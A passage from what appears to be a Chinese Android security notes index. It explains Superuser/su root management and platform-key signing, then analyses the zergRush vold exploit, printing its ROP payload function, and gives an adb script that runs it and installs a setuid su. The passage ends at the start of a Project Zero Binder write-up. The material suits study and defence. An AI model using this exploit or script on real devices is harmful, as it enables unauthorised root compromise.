com.koushikdutta.superuser/com.koushikdutta.superuser.SuperuserRequestActivity --ei uid %d --ei pid %d > /dev/null\", g_puid, ppid); if (system(sysCmd)) return executionFailure(\"am.\"); \u539f\u7406\u662fam\u547d\u4ee4\uff0c\u770b\u4e86\u4e0bam\u7684\u7528\u6cd5\uff0c\u660e\u767d\u4e86\uff1a \u5728Android\u4e2d\uff0c\u9664\u4e86\u4ece\u754c\u9762\u4e0a\u542f\u52a8\u7a0b\u5e8f\u4e4b\u5916\uff0c\u8fd8\u53ef\u4ee5\u4ece\u547d\u4ee4\u884c\u542f\u52a8\u7a0b\u5e8f\uff0c\u4f7f\u7528\u7684\u662f\u547d\u4ee4\u884c\u5de5\u5177am.\u542f\u52a8\u7684\u65b9\u6cd5\u4e3a $ adb shell $ su # am start -n \uff5b\u5305(package)\u540d\uff5d/\uff5b\u5305\u540d\uff5d.{\u6d3b\u52a8(activity)\u540d\u79f0} \u7a0b\u5e8f\u7684\u5165\u53e3\u7c7b\u53ef\u4ee5\u4ece\u6bcf\u4e2a\u5e94\u7528\u7684AndroidManifest.xml\u7684\u6587\u4ef6\u4e2d\u5f97\u5230\uff0c\u4ee5\u8ba1\u7b97\u5668\uff08calculator\uff09\u4e3a\u4f8b\uff0c\u5b83\u7684 <manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" \u2026 package=\"com.android.calculator2\" \u2026>\u2026 \u7531\u6b64\u8ba1\u7b97\u5668\uff08calculator\uff09\u7684\u542f\u52a8\u65b9\u6cd5\u4e3a\uff1a # am start -n com.android.calculator2/com.android.calculator2.Calculator \u4e00\u822c\u60c5\u51b5\u5e0c\u671b\uff0c\u4e00\u4e2aAndroid\u5e94\u7528\u5bf9\u5e94\u4e00\u4e2a\u5de5\u7a0b\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u6709\u4e00\u4e9b\u5de5\u7a0b\u5177\u6709\u591a\u4e2a\u6d3b\u52a8\uff08activity\uff09\uff0c\u800c\u6709\u4e00\u4e9b\u5e94\u7528\u4f7f\u7528\u4e00\u4e2a\u5de5\u7a0b\u3002\u4f8b\u5982\uff1a\u5728Android\u754c\u9762\u4e2d\uff0cMusic\u548cVideo\u662f\u4e24\u4e2a\u5e94\u7528\uff0c\u4f46\u662f\u5b83\u4eec\u4f7f\u7528\u7684\u90fd\u662fpackages/apps/Music\u8fd9\u4e00\u4e2a\u5de5\u7a0b\u3002\u800c\u5728\u8fd9\u4e2a\u5de5\u7a0b\u7684AndroidManifest.xml\u6587\u4ef6\u4e2d\uff0c\u6709\u5305\u542b\u4e86\u4e0d\u540c\u7684\u6d3b\u52a8\uff08activity\uff09\u3002 Music \u548c Video\uff08\u97f3\u4e50\u548c\u89c6\u9891\uff09\u7684\u542f\u52a8\u65b9\u6cd5\u4e3a\uff1a # am start -n com.android.music/com.android.music.MusicBrowserActivity # am start -n com.android.music/com.android.music.VideoBrowserActivity # am start -n com.android.music/com.android.music.MediaPlaybackActivity \u542f\u52a8\u6d4f\u89c8\u5668 : am start -a android.intent.action.VIEW -d http://www.google.cn/ \u62e8\u6253\u7535\u8bdd : am start -a android.intent.action.CALL -d tel:10086 \u542f\u52a8 google map\u76f4\u63a5\u5b9a\u4f4d\u5230\u5317\u4eac : am start -a android.intent.action.VIEW geo:0,0?q=beijing usage: am [subcommand] [options] start an Activity: am start [-D] [-W] <INTENT> -D: enable debugging -W: wait for launch to complete start a Service: am startservice <INTENT> send a broadcast Intent: am broadcast <INTENT> start an Instrumentation: am instrument [flags] <COMPONENT> -r: print raw results (otherwise decode REPORT_KEY_STREAMRESULT) -e <NAME> <VALUE>: set argument <NAME> to <VALUE> -p <FILE>: write profiling data to <FILE> -w: wait for instrumentation to finish before returning start profiling: am profile <PROCESS> start <FILE> stop profiling: am profile <PROCESS> stop <INTENT> specifications include these flags: [-a <ACTION>] [-d <DATA_URI>] [-t <MIME_TYPE>] [-c <CATEGORY> [-c <CATEGORY>] ...] [-e|--es <EXTRA_KEY> <EXTRA_STRING_VALUE> ...] [--esn <EXTRA_KEY> ...] [--ez <EXTRA_KEY> <EXTRA_BOOLEAN_VALUE> ...] [-e|--ei <EXTRA_KEY> <EXTRA_INT_VALUE> ...] [-n <COMPONENT>] [-f <FLAGS>] [--grant-read-uri-permission] [--grant-write-uri-permission] [--debug-log-resolution] [--activity-brought-to-front] [--activity-clear-top] [--activity-clear-when-task-reset] [--activity-exclude-from-recents] [--activity-launched-from-history] [--activity-multiple-task] [--activity-no-animation] [--activity-no-history] [--activity-no-user-action] [--activity-previous-is-top] [--activity-reorder-to-front] [--activity-reset-task-if-needed] [--activity-single-top] [--receiver-registered-only] [--receiver-replace-pending] [<URI>] \u8fd8\u6709\u4e2a\u7591\u70b9\uff0c\u5c31\u662fsu\u600e\u4e48\u77e5\u9053\u7528\u6237\u662f\u5141\u8bb8root\u6743\u9650\u8fd8\u662f\u53cd\u5bf9\u90a3\uff1f\u539f\u6765\u662f\u4e0a\u9762\u63d0\u5230\u7684\u767d\u540d\u5355\u8d77\u6765\u4f5c\u7528\uff0csuperuser\u628a\u7528\u6237\u7684\u9009\u62e9\u653e\u5165 \uff1a /data/data/com.koushikdutta.superuser/databases/superuser.sqlite \u6570\u636e\u5e93\u4e2d\uff0c\u7136\u540esu\u8fdb\u7a0b\u518d\u53bb\u8bfb\u8be5\u6570\u636e\u5e93\u6765\u5224\u65ad\u662f\u5426\u5141\u8bb8\u3002 static int checkWhitelist() { sqlite3 *db; int rc = sqlite3_open_v2(DBPATH, &db, SQLITE_OPEN_READWRITE, NULL); if (!rc) { char *errorMessage; char query[1024]; sprintf(query, \"select * from whitelist where _id=%d limit 1;\", g_puid); struct whitelistCallInfo callInfo; callInfo.count = 0; callInfo.db = db; rc = sqlite3_exec(db, query, whitelistCallback, &callInfo, &errorMessage); if (rc != SQLITE_OK) { sqlite3_close(db); return 0; } sqlite3_close(db); return callInfo.count; } sqlite3_close(db); return 0; }","title":"android superuser.apk\u7ba1\u7406root\u6743\u9650\u539f\u7406\u5206\u6790"},{"location":"Android/Android%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%92%8Croot%E6%9D%83%E9%99%90/#root","text":"| \u8f6c\u81ea: http://blog.csdn.net/liujian885/archive/2010/03/22/5404834.aspx \u5728 android\u7684API\u4e2d\u6709\u63d0\u4f9b SystemClock.setCurrentTimeMillis()\u51fd\u6570\u6765\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\uff0c\u53ef\u60dc\u65e0\u8bba\u4f60\u600e\u4e48\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u90fd\u662f\u6ca1\u7528\u7684\uff0c\u65e0\u8bba\u6a21\u62df\u5668\u8fd8\u662f\u771f\u673a\uff0c\u5728logcat\u4e2d\u603b\u4f1a\u5f97\u5230\"Unable to open alarm driver: Permission denied \".\u8fd9\u4e2a\u51fd\u6570\u9700\u8981root\u6743\u9650\u6216\u8005\u8fd0\u884c\u4e0e\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\u624d\u53ef\u4ee5\u7528\u3002\u672c\u6765\u4ee5\u4e3a\u5c31\u6ca1\u6709\u529e\u6cd5\u5728\u5e94\u7528\u7a0b\u5e8f\u8fd9\u4e00\u5c42\u6539\u7cfb\u7edf\u65f6\u95f4\u4e86\uff0c\u540e\u6765\u5728\u7f51\u4e0a\u641c\u4e86\u597d\u4e45\uff0c\u77e5\u9053\u8fd9\u4e2a\u76ee\u7684\u8fd8\u662f\u53ef\u4ee5\u8fbe\u5230\u7684\u3002 \u7b2c\u4e00\u4e2a\u65b9\u6cd5\u7b80\u5355\u70b9\uff0c\u4e0d\u8fc7\u9700\u8981\u5728Android\u7cfb\u7edf\u6e90\u7801\u7684\u73af\u5883\u4e0b\u7528make\u6765\u7f16\u8bd1\uff1a 1. \u5728\u5e94\u7528\u7a0b\u5e8f\u7684AndroidManifest.xml\u4e2d\u7684manifest\u8282\u70b9\u4e2d\u52a0\u5165android:sharedUserId=\"android.uid.system\"\u8fd9\u4e2a\u5c5e\u6027\u3002 2. \u4fee\u6539Android.mk\u6587\u4ef6\uff0c\u52a0\u5165LOCAL_CERTIFICATE := platform\u8fd9\u4e00\u884c 3. \u4f7f\u7528mm\u547d\u4ee4\u6765\u7f16\u8bd1\uff0c\u751f\u6210\u7684apk\u5c31\u6709\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\u7684\u6743\u9650\u4e86\u3002 \u7b2c\u4e8c\u4e2a\u65b9\u6cd5\u9ebb\u70e6\u70b9\uff0c\u4e0d\u8fc7\u4e0d\u7528\u5f00\u865a\u62df\u673a\u8dd1\u5230\u6e90\u7801\u73af\u5883\u4e0b\u7528make\u6765\u7f16\u8bd1\uff1a 1. \u540c\u4e0a\uff0c\u52a0\u5165android:sharedUserId=\"android.uid.system\"\u8fd9\u4e2a\u5c5e\u6027\u3002 2. \u4f7f\u7528eclipse\u7f16\u8bd1\u51faapk\u6587\u4ef6\uff0c\u4f46\u662f\u8fd9\u4e2aapk\u6587\u4ef6\u662f\u4e0d\u80fd\u7528\u7684\u3002 3. \u4f7f\u7528\u76ee\u6807\u7cfb\u7edf\u7684platform\u5bc6\u94a5\u6765\u91cd\u65b0\u7ed9apk\u6587\u4ef6\u7b7e\u540d\u3002\u8fd9\u6b65\u6bd4\u8f83\u9ebb\u70e6\uff0c\u9996\u5148\u627e\u5230\u5bc6\u94a5\u6587\u4ef6\uff0c\u5728\u6211\u7684Android\u6e90\u7801\u76ee\u5f55\u4e2d\u7684\u4f4d\u7f6e\u662f\"build\\target\\product\\security\"\uff0c\u4e0b\u9762\u7684platform.pk8\u548cplatform.x509.pem\u4e24\u4e2a\u6587\u4ef6\u3002\u7136\u540e\u7528Android\u63d0\u4f9b\u7684Signapk\u5de5\u5177\u6765\u7b7e\u540d\uff0csignapk\u7684\u6e90\u4ee3\u7801\u662f\u5728\"build\\tools\\signapk\"\u4e0b\uff0c\u7528\u6cd5\u4e3a\"signapk platform.x509.pem platform.pk8 input.apk output.apk\"\uff0c\u6587\u4ef6\u540d\u6700\u597d\u4f7f\u7528\u7edd\u5bf9\u8def\u5f84\u9632\u6b62\u627e\u4e0d\u5230\uff0c\u4e5f\u53ef\u4ee5\u4fee\u6539\u6e90\u4ee3\u7801\u76f4\u63a5\u4f7f\u7528\u3002 \u8fd9\u6837\u6700\u540e\u5f97\u5230\u7684apk\u548c\u7b2c\u4e00\u4e2a\u65b9\u6cd5\u662f\u4e00\u6837\u7684\u3002 \u6700\u540e\u89e3\u91ca\u4e00\u4e0b\u539f\u7406\uff0c\u9996\u5148\u52a0\u5165android:sharedUserId=\"android.uid.system\"\u8fd9\u4e2a\u5c5e\u6027\u3002\u901a\u8fc7Shared User id,\u62e5\u6709\u540c\u4e00\u4e2aUser id\u7684\u591a\u4e2aAPK\u53ef\u4ee5\u914d\u7f6e\u6210\u8fd0\u884c\u5728\u540c\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\u3002\u90a3\u4e48\u628a\u7a0b\u5e8f\u7684UID\u914d\u6210android.uid.system\uff0c\u4e5f\u5c31\u662f\u8981\u8ba9\u7a0b\u5e8f\u8fd0\u884c\u5728\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\uff0c\u8fd9\u6837\u5c31\u6709\u6743\u9650\u6765\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\u4e86\u3002 \u53ea\u662f\u52a0\u5165UID\u8fd8\u4e0d\u591f\uff0c\u5982\u679c\u8fd9\u65f6\u5019\u5b89\u88c5APK\u7684\u8bdd\u53d1\u73b0\u65e0\u6cd5\u5b89\u88c5\uff0c\u63d0\u793a\u7b7e\u540d\u4e0d\u7b26\uff0c\u539f\u56e0\u662f\u7a0b\u5e8f\u60f3\u8981\u8fd0\u884c\u5728\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\u8fd8\u8981\u6709\u76ee\u6807\u7cfb\u7edf\u7684platform key\uff0c\u5c31\u662f\u4e0a\u9762\u7b2c\u4e8c\u4e2a\u65b9\u6cd5\u63d0\u5230\u7684platform.pk8\u548cplatform.x509.pem\u4e24\u4e2a\u6587\u4ef6\u3002\u7528\u8fd9\u4e24\u4e2akey\u7b7e\u540d\u540eapk\u624d\u771f\u6b63\u53ef\u4ee5\u653e\u5165\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\u3002\u7b2c\u4e00\u4e2a\u65b9\u6cd5\u4e2d\u52a0\u5165LOCAL_CERTIFICATE := platform\u5176\u5b9e\u5c31\u662f\u7528\u8fd9\u4e24\u4e2akey\u6765\u7b7e\u540d\u3002 \u8fd9\u4e5f\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u5c31\u662f\u8fd9\u6837\u751f\u6210\u7684\u7a0b\u5e8f\u53ea\u6709\u5728\u539f\u59cb\u7684Android\u7cfb\u7edf\u6216\u8005\u662f\u81ea\u5df1\u7f16\u8bd1\u7684\u7cfb\u7edf\u4e2d\u624d\u53ef\u4ee5\u7528\uff0c\u56e0\u4e3a\u8fd9\u6837\u7684\u7cfb\u7edf\u624d\u53ef\u4ee5\u62ff\u5230platform.pk8\u548cplatform.x509.pem\u4e24\u4e2a\u6587\u4ef6\u3002\u8981\u662f\u522b\u5bb6\u516c\u53f8\u505a\u7684Android\u4e0a\u8fde\u5b89\u88c5\u90fd\u5b89\u88c5\u4e0d\u4e86\u3002\u8bd5\u8bd5\u539f\u59cb\u7684Android\u4e2d\u7684key\u6765\u7b7e\u540d\uff0c\u7a0b\u5e8f\u5728\u6a21\u62df\u5668\u4e0a\u8fd0\u884cOK\uff0c\u4e0d\u8fc7\u653e\u5230G3\u4e0a\u5b89\u88c5\u76f4\u63a5\u63d0\u793a\"Package ... has no signatures that match those in shared user android.uid.system\"\uff0c\u8fd9\u6837\u4e5f\u662f\u4fdd\u62a4\u4e86\u7cfb\u7edf\u7684\u5b89\u5168\u3002 \u6700\u6700\u540e\u8fd8\u8bf4\u4e0b\uff0c\u8fd9\u4e2aandroid:sharedUserId\u5c5e\u6027\u4e0d\u53ea\u53ef\u4ee5\u628aapk\u653e\u5230\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\uff0c\u4e5f\u53ef\u4ee5\u914d\u7f6e\u591a\u4e2aAPK\u8fd0\u884c\u5728\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\uff0c\u8fd9\u6837\u53ef\u4ee5\u5171\u4eab\u6570\u636e\uff0c\u5e94\u8be5\u4f1a\u5f88\u6709\u7528\u7684\u3002 signapk\u7f16\u8bd1\u7ed3\u675f\u540e\u5728 android\u76ee\u5f55\u4e0b/out/host/linux-x86/framework/signapk.jar \u4f7f\u7528\u65b9\u6cd5\uff1ajava -jar signapk.jar platform.x509.pem platform.pk8 test.apk test_signed.apk\u6587\u4ef6\u3002 | \u6f0f\u6d1e \u2014 zergRush \u63d0\u6743\u5b9e\u73b0\u7684\u4ee3\u7801\uff0c\u89c1\uff1a https://github.com/revolutionary/zergRush/blob/master/zergRush.c \u9700\u8981\u4e86\u89e3\u4e00\u4e0b\u662f\u54ea\u4e2a\u5730\u65b9\u6709\u95ee\u9898\uff0c\u8fb9\u5206\u6790\u8fb9\u8bb0\u5f55\u6b64\u6b21\u8fc7\u7a0b\u3002 \u6587\u4ef6\u4e0d\u5927\uff0c\u5f53\u7136\u4ece main \u5165\u624b\u4e86\uff0c if (geteuid() == 0 && getuid() == 0 && strstr(argv[0], \"boomsh\")) do_root(); \u660e\u663e\uff0c\u5f53\u6709\u4e86 Root \u80fd\u529b\u540e\u53bb\u505a\u4e00\u4e2a\u53ef\u4ee5\u4fdd\u6301 Root \u7684\u52a8\u4f5c\uff0c\u731c\u6d4b\uff0c\u6b64\u7a0b\u5e8f\u4f1a\u88ab\u8c03\u7528\u591a\u6b21\uff0c\u5e76\u4e14\u518d\u6b21\u8c03\u7528\u7684\u65f6\u5019\u7a0b\u5e8f\u540d\u79f0\u4e3a boomsh \u770b\u4e00\u4e0b do_root \u5427 \u5199\u4e86\u4e00\u4e2a\u5c5e\u6027 ro.kernel.qemu \u4e3a 1 \u660e\u663e\u662f\u8ba9\u624b\u673a\u5f53\u6210\u6a21\u62df\u5668\u8fd0\u884c\uff0c\u89c1 \\android2.32\\system\\core\\adb\\adb.c \u4e2d\u7684\u4ee3\u7801 1. /* run adbd in secure mode if ro.secure is set and 2. ** we are not in the emulator 3. */ 4. property_get(\"ro.kernel.qemu\", value, \"\"); 5. if (strcmp(value, \"1\") != 0) { 6. property_get(\"ro.secure\", value, \"\"); 7. if (strcmp(value, \"1\") == 0) { 8. // don't run as root if ro.secure is set... 9. secure = 1; 10. 11. // ... except we allow running as root in userdebug builds if the 12. // service.adb.root property has been set by the \"adb root\" command 13. property_get(\"ro.debuggable\", value, \"\"); 14. if (strcmp(value, \"1\") == 0) { 15. property_get(\"service.adb.root\", value, \"\"); 16. if (strcmp(value, \"1\") == 0) { 17. secure = 0; 18. } 19. } 20. } 21. } \u4ee5\u540e\u8c03\u7528 adb \u9ed8\u8ba4\u662f Root \u7528\u6237\u4e86\u3002 \u4e0b\u9762\u53c8\u505a\u4e86\u4e00\u4ef6\u4e8b\u628a\u81ea\u5df1\u62f7\u8d1d\u5230 /data/local/tmp/boomsh \u628a SH \u62f7\u8d1d\u5230 /data/local/tmp/sh \u6539\u53d8 /data/local/tmp/boomsh \u7684\u6743\u9650\u4e3a 711 \uff0c\u53ef\u6267\u884c\u4e86 \u7136\u540e\u83b7\u53d6 /system/bin/vold \u7a0b\u5e8f\u7684\u5927\u5c0f\uff0c \u901a\u8fc7 heap_addr = ((((st.st_size) + 0x8000) / 0x1000) + 1) * 0x1000; \u8fd9\u6837\u7684\u4e00\u4e2a\u8ba1\u7b97\uff0c\u5f97\u5230\u8be5\u7a0b\u5e8f\u7684\u5806\u5730\u5740\uff0c \u6709\u70b9\u610f\u601d\u4e86\uff0c\u5bf9 vold \u7a0b\u5e8f\u6709\u4e86\u6b6a\u8111\u7b4b\u4e86 \u7528\u8fc7\u5728\u624b\u673a\u4e0a\u7528 ps \u770b\u4e00\u4e0b\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u6709\u662f\u4ece root \u7528\u6237\u6267\u884c\u8fc7\u6765\u7684\u3002 \u7136\u540e\u83b7\u53d6\u4e86\u4e00\u4e0b\u624b\u673a\u7684\u7248\u672c\u53f7\uff0c\u53ea\u5bf9 2.2 2.3 \u4e8c\u4e2a\u7248\u672c\u8fdb\u884c\u5904\u7406\uff0c\u5e76\u4fee\u6b63\u4e86\u4e00\u4e0a heap_addr \u7684\u5730\u5740\u3002 \u7136\u540e\u53c8\u627e\u4e86\u4e00\u4e0b system \u7cfb\u7edf\u8c03\u7528\u51fd\u6570\u7684\u5730\u5740\uff0c\u653e\u5230 system_ptr \u4e2d \u7ee7\u7eed\u770b checkcrash() \u6e05\u9664\u4e86\u4e00\u4e0b logcat \u65e5\u5fd7 \u5220\u9664 /data/local/tmp/crashlog \u6587\u4ef6 \u7b80\u7acb\u4e00\u4e2a\u5b50\u8fdb\u7a0b\uff0c\u53bb\u751f\u6210\u4e00\u4e0b crashlog \u6587\u4ef6\u3002 \u8c03\u7528 do_fault \u6253\u5f00 crashlog \u6587\u4ef6 \u5728 crashlog \u4e2d\u627e\u5230\u5d29\u6e83\u4fe1\u606f\uff0c\u627e\u5230 sp \u5bc4\u5b58\u5668\u5730\u5740\u3002 \u7b49\u7b49\uff0c\u4e3a\u4ec0\u4e48\u5d29\u6e83\u5462\uff0c\u80af\u5b9a\u662f\u5728 do_fault \u4e2d\u5236\u9020\u7684\uff0c\u6211\u4eec\u8981\u770b\u770b\u8fd9\u5757\u4e86 \u8fd9\u4e2a\u51fd\u6570\u6bd4\u8f83\u4e71\uff0c\u627e\u627e\u91cd\u70b9\u770b if ((sock = socket_local_client(\"vold\", ANDROID_SOCKET_NAMESPACE_RESERVED, SOCK_STREAM)) < 0) \u4e0d\u9519\u7684\u4fe1\u606f\uff0c\u8fde\u63a5 vold \uff0c\u53c8\u662f\u5b83\uff0c\u4ee5\u524d\u542c\u8bf4\u8fc7\u5b83\u6709\u6f0f\u6d1e\uff0c\u8fd9\u6b21\u8fd8\u662f\u5b83\u3002 write(sock, buf, n+1) \u5199\u4e86\u4e00\u4e9b\u4fe1\u606f\uff0c\u4e0d\u77e5\u9053\u4ec0\u4e48\u4fe1\u606f\uff0c\u4f46\u662f\u53ef\u4ee5\u80af\u5b9a\u7684\u662f\uff0c\u80fd\u8ba9 vold \u5d29\u6e83\u7684\u4fe1\u606f\u3002 \u4e0b\u9762\u56de\u5230 main \u7ee7\u7eed\uff01 \u4e00\u4e2a For \u5faa\u73af\u5904\u7406\u3002 find_stack_addr \u7528\u4e86\u4e0a\u9762\u7684\u76f8\u540c\u65b9\u6cd5\uff0c\u4ece\u5d29\u6e83\u4fe1\u606f\u4e2d\u627e\u5230\u7a0b\u5e8f\u7684\u6808\u5730\u5740\uff0c\uff08\u81f3\u4e8e\u600e\u4e48\u8ba1\u7b97\u7684\uff0c\u4ee5\u540e\u518d\u53bb\u7814\u7a76\u4e86\uff09 \u4e00\u4e9b\u5bb9\u9519\u68c0\u67e5\uff0c\u7565\u8fc7\uff01 kill(logcat_pid, SIGKILL); unlink(crashlog); find_rop_gadgets() \u53c8\u4e00\u4e2a\u964c\u751f\u51fd\u6570\u3002\u770b\u4e86\uff0c\u6682\u65f6\u770b\u4e0d\u51fa\u7528\u9014\uff0c\u8c8c\u4f3c\u627e\u70b9\u4ec0\u4e48\uff0c\u7ee7\u7eed\uff01 \u4e0b\u9762\u5c31\u662f\u518d\u6b21\u8c03\u7528 do_fault ,\u751f\u6210\u5d29\u6e83\u3002 \u518d\u6b21\u5224\u65ad sh \u662f\u5426\u6709\u6ca1\u6709 s \u4f4d\uff0c \u5982\u679c\u6709\u4e86\uff0c\u521a ROOT \u529f\u4e86\u3002 \u7591\u95ee\u6765\u4e86\uff0c\u6ca1\u53d1\u73b0\u600e\u4e48\u518d\u6b21\u8c03\u7528 boomsh \u8fd0\u884c\u6267\u884c do_root \u554a\u3002 \u987a\u7740\u5b83\u62f7\u8d1d\u51fa\u6765\u7684 sh \u6587\u4ef6\u627e\u627e\uff0c\u641c\u7d22 bsh \u53d8\u7406\u7684\u4f7f\u7528\u60c5\u51b5\uff0c\u53d1\u73b0\u5982\u4e0b\u5730\u65b9\uff1a 1. static **int** do_fault() 2. { 3. **char** buf[255]; 4. **int** sock = -1, n = 0, i; 5. **char** s_stack_addr[5], s_stack_pivot_addr[5], s_pop_r0_addr[5], s_system[5], s_bsh_addr[5], s_heap_addr[5]; 6. uint32_t bsh_addr; 7. **char** padding[128]; 8. int32_t padding_sz = (jumpsz == 0 ? 0 : gadget_jumpsz - jumpsz); 9. 10. memset(padding, 0, 128); 11. strcpy(padding, \"LORDZZZZzzzz\"); 12. if(padding_sz > 0) { 13. memset(padding+12, 'Z', padding_sz); 14. printf(\"[*] Poping %d more zerglings\\n\", padding_sz); 15. } 16. else if(padding_sz < 0) { 17. memset(padding, 0, 128); 18. memset(padding, 'Z', 12+padding_sz); 19. } 20. 21. if ((sock = socket_local_client(\"vold\", ANDROID_SOCKET_NAMESPACE_RESERVED, SOCK_STREAM)) < 0) 22. die(\"[-] Error creating Nydus\"); 23. 24. sprintf(s_stack_addr, \"%c%c%c%c\", stack_addr & 0xff, (stack_addr>>8)&0xff, (stack_addr>>16)&0xff, (stack_addr>>24)&0xff); 25. sprintf(s_stack_pivot_addr, \"%c%c%c%c\", stack_pivot & 0xff, (stack_pivot>>8)&0xff, (stack_pivot>>16)&0xff, (stack_pivot>>24)&0xff); 26. sprintf(s_pop_r0_addr, \"%c%c%c%c\", pop_r0 & 0xff, (pop_r0>>8)&0xff, (pop_r0>>16)&0xff, (pop_r0>>24)&0xff); 27. sprintf(s_system, \"%c%c%c%c\", system_ptr & 0xff, (system_ptr>>8)&0xff, (system_ptr>>16)&0xff, (system_ptr>>24)&0xff); 28. sprintf(s_heap_addr, \"%c%c%c%c\", heap_addr & 0xff, (heap_addr>>8)&0xff, (heap_addr>>16)&0xff, (heap_addr>>24)&0xff); 29. 30. strcpy(buf, \"ZERG\"); 31. strcat(buf, \" ZZ \"); 32. strcat(buf, s_stack_pivot_addr); 33. for(i=3; i < buffsz+1; i++) 34. strcat(buf, \" ZZZZ\"); 35. strcat(buf, \" \"); 36. strcat(buf, s_heap_addr); 37. 38. n = strlen(buf); 39. bsh_addr = stack_addr + n + 1 + 8 + 8 + 8 + padding_sz + 12 + 4; 40. 41. if(check_addr(bsh_addr) == -1) { 42. printf(\"[-] Colossus, we're doomed!\\n\"); 43. exit(-1); 44. } 45. 46. sprintf(s_bsh_addr, \"%c%c%c%c\", bsh_addr & 0xff, (bsh_addr>>8)&0xff, (bsh_addr>>16)&0xff, (bsh_addr>>24)&0xff); 47. 48. <strong><span style=\"color:#ffffff;BACKGROUND-COLOR: #ff0000\">n += sprintf(buf+n+1, \"%s%s OVER%s%s%s%sZZZZ%s%c\", s_stack_addr, s_heap_addr, padding, s_pop_r0_addr, s_bsh_addr, s_system, bsh, 0);</span></strong> 49. 50. printf(\"[*] Sending %d zerglings ...\\n\", n); 51. 52. if ((n = write(sock, buf, n+1)) < 0) 53. die(\"[-] Nydus seems broken\"); 54. 55. sleep(3); 56. close(sock); 57. 58. return n; 59. } \u770b\u5230\u4e0a\u9762\u52a0\u8272\u7684\u884c\u4e86\uff0c\u539f\u6765\u4ed6\u662f\u7528 socket \u5199\u7684\u4e00\u4e2a shell code \uff0c\u8c03\u7528\u4e86\u4ed6\u62f7\u8d1d\u7684 sh \u7a0b\u5e8f\u3002 \u5728 vold \u4e2d\u6267\u884c sh \u80af\u5b9a\u662f root \u554a\u3002 \u81f3\u6b64\uff0c\u539f\u7406\u5f88\u662f\u6e05\u695a\u4e86\uff0c shell code \u561b\uff0c\u8fd0\u884c\u7684\u65f6\u5019\u628a\u4ed6 dump \u51fa\u6765\u7528\u522b\u7684\u5de5\u5177\u770b\u5427\uff01 **\u4e00\u952eROOT\u811a\u672c** 1.\u7b49\u5f85\u8bbe\u5907\u8fde\u63a5 adb wait-for-device 2.\u5220\u9664\u6587\u4ef6 adb shell \"cd /data/local/tmp/; rm *\" 3.\u4e0a\u4f20zergRush\u5e76\u4fee\u6539\u5c5e\u6027\u53bb\u6267\u884c adb push c:\\zergRush /data/local/tmp/ adb shell \"chmod 777 /data/local/tmp/zergRush\" adb shell \"/data/local/tmp/zergRush\" adb wait-for-device 4.\u4e0a\u4f20busybox\u3001\u7ed9busybox\u6587\u4ef6\u6267\u884c\u6743\u9650\uff0c\u4ee5\u53ef\u4ee5\u65b9\u5f0f\u52a0\u8f7d\u6587\u4ef6\u7cfb\u7edf adb push c:\\busybox /data/local/tmp/ adb shell \"chmod 755 /data/local/tmp/busybox\" adb shell \"/data/local/tmp/busybox mount -o remount,rw /system\" 5.\u590d\u5236busybox\uff0c\u4fee\u6539\u6240\u5728\u7684\u7ec4\u53ca\u8bbe\u7f6es\u4f4d adb shell \"dd if=/data/local/tmp/busybox of=/system/xbin/busybox\" adb shell \"chown root.shell /system/xbin/busybox\" adb shell \"chmod 04755 /system/xbin/busybox\" 6.\u5b89\u88c5busybox\u5e76\u5220\u9664\u4e34\u65f6\u6587\u4ef6 adb shell \"/system/xbin/busybox --install -s /system/xbin\" adb shell \"rm -rf /data/local/tmp/busybox\" 7.\u5bf9su\u8fdb\u884c\u7c7b\u4f3cbusybox\u7684\u5904\u7406 adb push c:\\fu /system/bin/su adb shell \"chown root.shell /system/bin/su\" adb shell \"chmod 06755 /system/bin/su\" adb shell \"rm /system/xbin/su\" adb shell \"ln -s /system/bin/su /system/xbin/su\" 8.\u5b89\u88c5\u5176\u5b83\u5de5\u5177 adb push c:\\superuser.apk /system/app/ adb shell \"cd /data/local/tmp/; rm *\" adb reboot adb wait-for-device adb install c:\\recovery.apk \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/superkris/article/details/7709504","title":"\u83b7\u53d6\u4e00\u952eroot\u539f\u7406"},{"location":"Android/Bad%20Binder%3AAndroid%20In-The-Wild%20Exploit/","text":"Bad Binder:Android In-The-Wild Exploit Posted by Maddie Stone, Project Zero Introduction On October 3, 2019, we disclosed issue 1942 (CVE-2019-2215), which is a use-after-free in Binder in the Android kernel. The bug is a local privilege escalation vulnerability that allows for a full compromise of a vulnerable device. If chained with a browser renderer exploit, this bug could fully compromise a device through a malicious website. We reported this bug under a 7-day disclosure deadline rather than the normal 90-day disclosure deadline. We made this decision based on credible evidence that an exploit for this vulnerability exists in the wild and that it's highly likely that the exploit was being actively used against users. In May 2019, Project Zero published a blog post and spreadsheet for tracking \u201cin-the-wild\u201d 0-day exploits. In July 2019, I joined Project Zero to focus on the use of 0-day exploits in the wild. We expect our approach to this work will change and mature as we gain more experience with studying 0-days, but the mission stays the same: to \u201cmake zero-day hard\u201d. So far there are a few key approaches that we have started with: Hunt for bugs based on rumors/leads that a 0-day is currently in use. We will use our bug hunting expertise to find and patch the bug, rendering the exploit benign. Perform variant analysis on 0-days used in the wild. When looking for bugs, you often find more than one of a similar type at the same time. However, an exploit usually uses one instance of a possible pattern or variant. If we can find and resolve all of the similar variant bugs, then the effort involved in creating a new exploit will be higher. Complete detailed analysis of the 0-days from the point of view of bug hunters and exploit developers and share it back with the community. Transparency and collaboration are key. We want to share detailed root cause analysis to inform developers and defenders on how to prevent these types of bugs in the future and improve detection. We hope that by publishing details about the exploit and its methodology, this can inform threat intelligence and incident responders. Overall, we want to make information that\u2019s often kept in silos accessible to all. This is just the starting point of how we\u2019re thinking about tactical work around 0-day exploits used in the wild, but we won\u2019t make much progress if we try to do this alone. Whether you\u2019re a 